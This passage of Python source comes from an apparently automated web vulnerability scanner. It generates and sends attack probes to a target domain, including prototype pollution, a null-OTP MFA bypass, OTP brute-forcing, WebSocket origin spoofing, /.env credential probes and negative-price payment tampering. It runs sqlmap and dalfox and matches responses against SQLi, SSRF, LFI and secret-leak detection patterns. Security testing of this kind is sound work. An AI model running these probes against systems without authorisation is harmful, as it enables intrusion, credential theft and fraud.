                params={"__proto__[polluted]": "true"},
                description="Prototype pollution via GET param __proto__[polluted]=true",
                expected_indicator="Response reflects 'polluted' property or changed behavior",
                severity="high",
            ),
            AttackTest(
                test_id=f"{theory.theory_id}_proto_post",
                theory_id=theory.theory_id,
                vuln_type=theory.vuln_type,
                endpoint=theory.endpoint,
                method="POST",
                body='{"__proto__":{"polluted":true}}',
                headers={"Content-Type": "application/json"},
                description="Prototype pollution via JSON POST __proto__.polluted",
                expected_indicator="polluted=true reflected in response or status change",
                severity="high",
            ),
        ]

    def _gen_clickjacking_tests(self, theory) -> list[AttackTest]:
        return [
            AttackTest(
                test_id=f"{theory.theory_id}_clickjacking_headers",
                theory_id=theory.theory_id,
                vuln_type=theory.vuln_type,
                endpoint=theory.endpoint,
                method="GET",
                description="Clickjacking: check X-Frame-Options and CSP frame-ancestors headers",
                expected_indicator="Missing X-Frame-Options and no frame-ancestors in CSP",
                severity="medium",
                tool_args={"check_headers": ["X-Frame-Options", "Content-Security-Policy"]},
            ),
        ]

    def _gen_pii_exposure_tests(self, theory) -> list[AttackTest]:
        return [
            AttackTest(
                test_id=f"{theory.theory_id}_pii_scan",
                theory_id=theory.theory_id,
                vuln_type=theory.vuln_type,
                endpoint=theory.endpoint,
                method="GET",
                headers={"Accept": "application/json"},
                description="PII scan: inspect response for email, phone, SSN, credit card, Aadhaar, PAN patterns",
                expected_indicator="Sensitive personal data visible in API response",
                severity="high",
            ),
        ]

    def _gen_mfa_bypass_tests(self, theory) -> list[AttackTest]:
        return [
            AttackTest(
                test_id=f"{theory.theory_id}_mfa_null",
                theory_id=theory.theory_id,
                vuln_type=theory.vuln_type,
                endpoint=theory.endpoint,
                method="POST",
                body='{"otp": null}',
                headers={"Content-Type": "application/json"},
                description="MFA bypass: submit null OTP value",
                expected_indicator="200 OK or session token issued — MFA not enforced",
                severity="critical",
            ),
            AttackTest(
                test_id=f"{theory.theory_id}_mfa_rate",
                theory_id=theory.theory_id,
                vuln_type=theory.vuln_type,
                endpoint=theory.endpoint,
                method="POST",
                description="MFA brute-force: 10 rapid OTP submissions — check for 429 rate limit",
                expected_indicator="No 429 after 10 attempts — no rate limiting on MFA endpoint",
                severity="high",
                tool_args={"repeat": 10, "interval_ms": 200},
            ),
        ]

    def _gen_websocket_tests(self, theory) -> list[AttackTest]:
        return [
            AttackTest(
                test_id=f"{theory.theory_id}_ws_no_origin",
                theory_id=theory.theory_id,
                vuln_type=theory.vuln_type,
                endpoint=theory.endpoint,
                method="GET",
                headers={"Origin": "https://evil.com", "Upgrade": "websocket"},
                description="WebSocket origin validation: connect from evil.com origin",
                expected_indicator="101 Switching Protocols accepted — missing Origin validation",
                severity="high",
            ),
        ]

    def _gen_source_map_tests(self, theory) -> list[AttackTest]:
        return [
            AttackTest(
                test_id=f"{theory.theory_id}_source_map",
                theory_id=theory.theory_id,
                vuln_type=theory.vuln_type,
                endpoint=theory.endpoint + ".map",
                method="GET",
                description="Source map exposure: request <endpoint>.map and common .map paths",
                expected_indicator="200 OK with JSON source map containing original source paths",
                severity="medium",
            ),
            AttackTest(
                test_id=f"{theory.theory_id}_env_exposure",
                theory_id=theory.theory_id,
                vuln_type=theory.vuln_type,
                endpoint="/.env",
                method="GET",
                description="Environment file exposure: probe /.env for leaked credentials",
                expected_indicator="200 OK with APP_KEY, DB_PASSWORD, or API keys",
                severity="critical",
            ),
        ]

    def _gen_payment_tampering_tests(self, theory) -> list[AttackTest]:
        return [
            AttackTest(
                test_id=f"{theory.theory_id}_payment_neg",
                theory_id=theory.theory_id,
                vuln_type=theory.vuln_type,
                endpoint=theory.endpoint,
                method="POST",
                body='{"amount": -1, "price": -0.01}',
                headers={"Content-Type": "application/json"},
                description="Payment tampering: submit negative amount/price values",
                expected_indicator="200 OK or credit applied — server accepts negative values",
                severity="critical",
            ),
            AttackTest(
                test_id=f"{theory.theory_id}_payment_zero",
                theory_id=theory.theory_id,
                vuln_type=theory.vuln_type,
                endpoint=theory.endpoint,
                method="POST",
                body='{"amount": 0, "price": 0.001}',
                headers={"Content-Type": "application/json"},
                description="Payment tampering: submit zero/minimal price",
                expected_indicator="Order processed at zero cost",
                severity="critical",
            ),
        ]

    def _gen_generic_tests(self, theory) -> list[AttackTest]:
        return [
            AttackTest(
                test_id=f"{theory.theory_id}_generic",
                theory_id=theory.theory_id,
                vuln_type=theory.vuln_type,
                endpoint=theory.endpoint,
                method="GET",
                description=f"Generic probe for {theory.vuln_type}",
                expected_indicator="Unexpected response",
                severity=theory.severity,
            ),
        ]

    # ── Test executor ─────────────────────────────────────────────────────────

    def _execute_single(self, test: AttackTest) -> TestResult:
        """Dispatch to the right executor based on test.tool."""
        if test.tool == "sqlmap" and self._tool_available("sqlmap"):
            return self._execute_sqlmap(test)
        if test.tool == "dalfox" and self._tool_available("dalfox"):
            return self._execute_dalfox(test)
        # Default: direct HTTP request
        return self._execute_http(test)

    def _execute_http(self, test: AttackTest) -> TestResult:
        """Execute test via urllib."""
        t0 = time.time()
        url = self._build_url(test.endpoint, test.params)
        try:
            req = urllib.request.Request(url, method=test.method)
            for k, v in (test.headers or {}).items():
                req.add_header(k, v)
            if test.body:
                body_bytes = (
                    json.dumps(test.body).encode()
                    if isinstance(test.body, dict)
                    else test.body.encode()
                )
                req.data = body_bytes

            with urllib.request.urlopen(req, timeout=self.timeout) as resp:
                raw = resp.read(8192).decode("utf-8", errors="replace")
                status = resp.getcode()
                resp_headers = dict(resp.headers)
        except urllib.error.HTTPError as e:
            raw = ""
            try:
                raw = e.read(2048).decode("utf-8", errors="replace")
            except Exception:
                pass
            status = e.code
            resp_headers = {}
        except Exception as exc:
            elapsed = (time.time() - t0) * 1000
            return TestResult(
                test_id=test.test_id, theory_id=test.theory_id,
                vuln_type=test.vuln_type, endpoint=test.endpoint,
                success=False, error=str(exc),
                response_time_ms=elapsed,
            )

        elapsed = (time.time() - t0) * 1000
        confirmed, evidence, score = self._analyze_http_response(
            test, status, raw, resp_headers, elapsed
        )
        return TestResult(
            test_id=test.test_id,
            theory_id=test.theory_id,
            vuln_type=test.vuln_type,
            endpoint=test.endpoint,
            success=True,
            status_code=status,
            response_size=len(raw),
            response_time_ms=elapsed,
            response_snippet=raw[:300],
            confirmed=confirmed,
            evidence=evidence,
            anomaly_score=score,
            payload_used=test.payload_used or (test.params.get(next(iter(test.params), ""), "") if test.params else ""),
        )

    def _execute_sqlmap(self, test: AttackTest) -> TestResult:
        """Execute sqlmap via ToolRegistry or subprocess."""
        t0 = time.time()
        url = self._build_url(test.endpoint, test.params)
        if self.tool_registry:
            d = self.tool_registry.run(
                "sqlmap", url=url,
                level=test.tool_args.get("level", 1),
                risk=test.tool_args.get("risk", 1),
                timeout=test.tool_args.get("timeout", 300),
            )
            data = d.data if hasattr(d, "data") else d
            vulnerable = bool(data and data.get("is_vulnerable"))
            evidence = str(data.get("injection_types", [])) if vulnerable else ""
            return TestResult(
                test_id=test.test_id, theory_id=test.theory_id,
                vuln_type=test.vuln_type, endpoint=test.endpoint,
                success=True, confirmed=vulnerable,
                evidence=evidence,
                response_time_ms=(time.time() - t0) * 1000,
                anomaly_score=0.95 if vulnerable else 0.0,
            )
        return self._execute_http(test)

    def _execute_dalfox(self, test: AttackTest) -> TestResult:
        """Execute dalfox for XSS detection."""
        t0 = time.time()
        url = self._build_url(test.endpoint, test.params)
        if self.tool_registry:
            d = self.tool_registry.run("dalfox", url=url,
                                       timeout=test.tool_args.get("timeout", 60))
            data = d.data if hasattr(d, "data") else d
            findings = data.get("findings", []) if isinstance(data, dict) else []
            confirmed = bool(findings)
            return TestResult(
                test_id=test.test_id, theory_id=test.theory_id,
                vuln_type=test.vuln_type, endpoint=test.endpoint,
                success=True, confirmed=confirmed,
                evidence=str(findings[:1]) if findings else "",
                response_time_ms=(time.time() - t0) * 1000,
                anomaly_score=0.95 if confirmed else 0.0,
            )
        return self._execute_http(test)

    def _analyze_http_response(
        self, test: AttackTest, status: int, body: str,
        headers: dict, elapsed_ms: float
    ) -> tuple[bool, str, float]:
        """
        Analyze HTTP response to determine if the test confirmed a vulnerability.
        Returns (confirmed, evidence, anomaly_score).
        """
        confirmed = False
        evidence = ""
        score = 0.0

        # SQL error patterns
        if "SQL Injection" in test.vuln_type:
            sql_errors = [
                "you have an error in your sql", "syntax error", "unclosed quotation",
                "mysql_fetch", "pg_query", "oci_execute", "mssql_query",
                "microsoft ole db", "odbc sql server", "ora-01756",
                "invalid query", "sqlite_error",
            ]
            for err in sql_errors:
                if err in body.lower():
                    confirmed = True
                    score = 0.90
                    evidence = f"SQL error found: '{err}'"
                    break
            if elapsed_ms > 4500:  # time-based detection
                score = max(score, 0.75)
                evidence = evidence or f"Response delayed {elapsed_ms:.0f}ms (possible blind SQLi)"

        # XSS reflection
        elif "XSS" in test.vuln_type and test.payload_used:
            if test.payload_used in body:
                score = 0.70
                evidence = f"Payload '{test.payload_used[:40]}' reflected in response"
                if "<script>" in body.lower() or "onerror=" in body.lower():
                    confirmed = True
                    score = 0.92

        # SSRF indicators
        elif "SSRF" in test.vuln_type:
            ssrf_indicators = [
                "ami-id", "ami-launch-index", "instance-id",  # AWS metadata
                "computeMetadata", "serviceAccounts",            # GCP
                "x-metadata", "ims/security-credentials",       # Azure
            ]
            for ind in ssrf_indicators:
                if ind in body:
                    confirmed = True
                    score = 0.95
                    evidence = f"Cloud metadata leaked: '{ind}'"
                    break

        # LFI indicators
        elif "LFI" in test.vuln_type:
            if "root:" in body or "[boot loader]" in body or "daemon:" in body:
                confirmed = True
                score = 0.95
                evidence = "System file content (/etc/passwd or hosts) in response"

        # SSTI confirmation (7*7=49)
        elif "SSTI" in test.vuln_type:
            if "49" in body and test.payload_used in ["{{7*7}}", "${7*7}", "#{7*7}", "*{7*7}"]:
                confirmed = True
                score = 0.95
                evidence = "SSTI confirmed: 7*7=49 in response"

        # Auth bypass: non-403/401 on protected endpoint
        elif "Auth" in test.vuln_type or "Bypass" in test.vuln_type:
            if status not in (401, 403):
                score = 0.65
                evidence = f"Status {status} (not 401/403) on protected endpoint"
                if status == 200:
                    confirmed = True
                    score = 0.85

        # Open redirect
        elif "Redirect" in test.vuln_type:
            loc = headers.get("Location", headers.get("location", ""))
            if "evil.com" in loc:
                confirmed = True
                score = 0.95
                evidence = f"Redirect to evil.com: Location: {loc}"

        # CORS
        elif "CORS" in test.vuln_type:
            acao = headers.get("Access-Control-Allow-Origin", "")
            acac = headers.get("Access-Control-Allow-Credentials", "")
            if acao == "https://evil.com" or acao == "null":
                score = 0.80
                evidence = f"ACAO reflects injected origin: {acao}"
                if acac.lower() == "true":
                    confirmed = True
                    score = 0.95
                    evidence += " with credentials: true (CRITICAL)"

        # Debug disclosure
        elif "Debug" in test.vuln_type or "Disclosure" in test.vuln_type:
            secrets = ["APP_KEY=", "DB_PASSWORD=", "AWS_SECRET", "api_key",
                       "traceback", "stack trace", "exception in thread"]
            for s in secrets:
                if s.lower() in body.lower():
                    confirmed = True
                    score = 0.92
                    evidence = f"Sensitive disclosure: '{s}' found"
                    break

        return confirmed, evidence, score

    # ── Helpers ───────────────────────────────────────────────────────────────

    def _build_url(self, path: str, params: dict | None = None) -> str:
        if path.startswith("http"):
            url = path
        else:
            url = self.base_url.rstrip("/") + "/" + path.lstrip("/")
        if params:
            qs = urllib.parse.urlencode(params)
            url = f"{url}?{qs}" if "?" not in url else f"{url}&{qs}"
        return url

    def _tool_available(self, name: str) -> bool:
        import shutil
        return shutil.which(name) is not None

    def _sleep_rate(self):
        now = time.time()
        wait = self.rate_limit - (now - self._last_request_time)
        if wait > 0:
            time.sleep(wait)
        self._last_request_time = time.time()


# ── CLI entry point ───────────────────────────────────────────────────────────

def main_cli(args):
    from oneinfinity.modules.utils import banner, section, ok, info, warn
    target = args.domain
    output = resolve_output_dir(getattr(args, "output", None), target)
    banner(f"Custom Test Runner — {target}")

    # Load theories
    theories_file = Path(output) / "theories.json"
    if not theories_file.exists():
        warn("No theories.json found. Run: oneinfinity generate-theories <domain> first")
        return

    from oneinfinity.vulnerability_theory_engine import TheorySet, VulnTheory
    data = json.loads(theories_file.read_text())
    theories = [
        VulnTheory(
            theory_id=t["theory_id"], vuln_type=t["vuln_type"],
            endpoint=t["endpoint"], parameters=t["parameters"],
            confidence=t["confidence"], severity=t["severity"],
            reasoning=t["reasoning"], attack_hints=t["attack_hints"],
            tags=t.get("tags", []), status=t.get("status", "pending"),
        )
        for t in data.get("theories", [])
    ]

    # Determine base URL
    alive_file = Path(output) / "alive_hosts.json"
    base_url = f"https://{target}"
    if alive_file.exists():
        try:
            alive_data = json.loads(alive_file.read_text())
            hosts = alive_data.get("hosts", alive_data) if isinstance(alive_data, dict) else alive_data
            if hosts:
                base_url = hosts[0].get("url", base_url) if isinstance(hosts[0], dict) else base_url
        except Exception:
            pass

    engine = CustomTestEngine(
        target=target, output_dir=output, base_url=base_url,
        rate_limit=getattr(args, "rate", 1.0),
        oob_url=getattr(args, "oob", "") or "",
    )

    # Filter by severity
    min_sev = getattr(args, "min_severity", "medium") or "medium"
    sev_order = {"critical": 0, "high": 1, "medium": 2, "low": 3}
    min_sev_weight = sev_order.get(min_sev, 2)
    theories = [t for t in theories if sev_order.get(t.severity, 3) <= min_sev_weight]

    passive_only = getattr(args, "passive", True)
    info(f"Designing tests for {len(theories)} theories (passive_only={passive_only})...")

    all_tests: list = []
    for theory in theories:
        tests = engine.generate_attack_tests(theory)
        if passive_only:
            tests = [t for t in tests if t.passive]
        all_tests.extend(tests)

    info(f"Executing {len(all_tests)} tests against {base_url}")
    warn("All tests are non-destructive probes unless --no-passive flag is used.")
    print()

    results = engine.execute_attack_tests(all_tests)

    confirmed = [r for r in results if r.confirmed]
    section(f"Results: {len(confirmed)}/{len(results)} confirmed")
    for r in confirmed:
        print(f"  [\033[0;31mCONFIRMED\033[0m] {r.vuln_type} — {r.endpoint}")
        print(f"    Evidence: {r.evidence}")
        print(f"    Score   : {r.anomaly_score:.0%}")
        print()

    ok(f"Results saved: {output}/test_results.json")
    print()
